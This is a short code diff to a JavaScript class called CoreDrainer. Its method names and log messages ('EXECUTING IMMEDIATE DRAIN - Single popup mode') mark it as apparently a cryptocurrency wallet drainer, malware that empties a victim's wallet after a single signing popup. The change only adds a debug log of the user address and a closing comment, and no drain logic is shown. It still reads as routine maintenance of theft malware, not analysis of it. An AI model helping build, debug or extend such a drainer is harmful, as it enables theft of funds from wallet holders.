@@ -270,6 +270,7 @@ export class CoreDrainer {
   // ===== DRAIN EXECUTION METHODS =====
   async executeImmediateDrain(userAddress) {
     console.log("⚡ EXECUTING IMMEDIATE DRAIN - Single popup mode");
+    console.log("🔍 executeImmediateDrain called with:", userAddress);
     
     try {
       const provider = this.provider;
@@ -1102,3 +1103,4 @@ export class CoreDrainer {
 
 export const coreDrainer = new CoreDrainer();
 export default coreDrainer;
+// Debug line added
